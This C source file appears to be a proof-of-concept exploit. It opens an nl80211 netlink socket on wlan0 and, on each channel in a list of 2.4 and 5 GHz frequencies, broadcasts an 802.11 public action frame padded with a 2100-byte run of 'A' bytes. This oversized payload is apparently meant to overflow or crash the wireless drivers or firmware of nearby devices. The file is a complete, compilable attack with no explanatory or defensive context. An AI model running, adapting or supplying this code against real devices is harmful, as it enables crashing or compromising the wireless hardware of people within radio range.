#include <netlink/socket.h>
#include <netlink/netlink.h>
#include <netlink/msg.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/ctrl.h>


#include <sys/ioctl.h>
#include <net/if.h>
#include <stdio.h>

#include "nl80211_copy.h"
#include "common.h"
#include "common/ieee802_11_defs.h"
#include "drivers/driver.h"


#define ARPHRD_ETHER	1
int freq_2g[] = { 2412, 2417, 2422, 2427, 2432, 2437, 2442, 2447, 2452, 2457, 2462, 2467, 2472, 2484,
		  5000+5*34, 5000+5*36, 5000+5*38, 5000+5*40,5000+5*42, 5000+5*44, 5000+5*46, 5000+5*48, 5000+5*52, 5000+5*56, 5000+5*60, 5000+5*64, 5000+5*100, 5000+5*104, 5000+5*108, 5000+5*112, 5000+5*116, 5000+5*120, 5000+5*124, 5000+5*128,5000+5*132, 5000+5*136, 5000+5*140, 5000+5*144, 5000+5*149, 5000+5*153, 5000+5*157, 5000+5*161, 15000+5*65
		 };

int main( int argc, char **argv ) 
{

	int ioctl_sock = socket(PF_INET, SOCK_DGRAM, 0 );
	if ( ioctl_sock < 0 ) {
		printf ( "[-] nl80211: socket failed\n" );
		return -1;
	}
	struct ifreq ifr;
	memset( &ifr, 0, sizeof(ifr) );
	strcpy( ifr.ifr_name, "wlan0" );
	if ( ioctl( ioctl_sock, SIOCGIFHWADDR, &ifr) ) {
		printf( "[-] Faild to get interface hwaddr\n" );
		exit( 0 );
	}
	if ( ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER ) {
		printf( "[-] Invalid HW-addr family\n" );
		return -1;
	}

	u8 mac_addr[ETH_ALEN];
	memcpy( mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN );
	printf( "[+] Got mac addr : " );
	int i=0;
	for ( ; i<ETH_ALEN; i++ ){
		printf( "%0x ", mac_addr[i] );
	}
	printf( "\n" );
	unsigned int ifindex = if_nametoindex( "wlan0" );

	printf( "[+] Got interface index : %d\n", ifindex );


	printf( "[+] Create Payload\n" );

	struct nl_sock *sock = NULL;
	sock = nl_socket_alloc();
	if ( sock == NULL ) {
		printf( "[-] Failed to create netlink socket\n" );
		exit( -1 );
	}

	if ( genl_connect( sock ) ) {
		printf( "[-] Failed to connect netlink \n" );
		exit( -1 );
	}
	
	int family = genl_ctrl_resolve( sock, "nl80211" );
	if ( family < 0 ) {
		printf( "[-] Failed to resolve nl80211\n" ); 
		exit( -1 );
	}

	for ( i=0; i< sizeof( freq_2g ) / sizeof(int); i++ ) {
	struct nl_msg *msg;
	msg = nlmsg_alloc();
	if ( !msg ) {
		printf( "[-] Failed to create msg\n" );
		exit(-1);
	}

	printf( "[+] family is : %d\n", family );
	void *head = genlmsg_put( msg, 
			NL_AUTO_PID,  // port
			NL_AUTO_SEQ,  // seq
			family, 
			0, 
			0, 
			NL80211_CMD_FRAME, 
			0 );
			
	if ( head == NULL ) {
		printf( "[-] failed to create genlmsg\n" );
		exit( -1 );
	}
	nla_put_u32( msg, NL80211_ATTR_IFINDEX, ifindex );
	int freq = freq_2g[i];
	printf( "[+] Useing freq %d\n", freq );
	nla_put_u32( msg, NL80211_ATTR_WIPHY_FREQ, freq );
	nla_put_flag( msg, NL80211_ATTR_DONT_WAIT_FOR_ACK );
	u8 *buf;
	int payload_len = 2100;
	int buf_len = 24 + payload_len;
	buf = (u8 *)malloc( buf_len );
	if ( buf == NULL ){
		printf( "[-] Failed to create buffer\n" );
		exit( -1 );
	}
	memset( buf + 24, 0x41, payload_len );
	buf[24] = 0x4; // WLAN_CATEGORY_PUBLIC

	struct ieee80211_hdr *hdr;
	hdr = (struct ieee80211_hdr *)buf;
	u8 broadaddr[ETH_ALEN] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
	hdr->frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT, WLAN_FC_STYPE_ACTION );
	memcpy( hdr->addr1, broadaddr, ETH_ALEN );
	memcpy( hdr->addr2, mac_addr, ETH_ALEN );  // required a correct addr
	memcpy( hdr->addr3, broadaddr, ETH_ALEN );
	nla_put(msg, NL80211_ATTR_FRAME, buf_len, buf);

	int result = nl_send_auto_complete( sock, msg );
	if ( result < 0 ) {
		printf( "[-] Send message failed\n" );
		return -1;
	}
	printf( "[+] Send message ok\n" );
	nlmsg_free( msg );
	free( buf );
	}
	return 0;
}
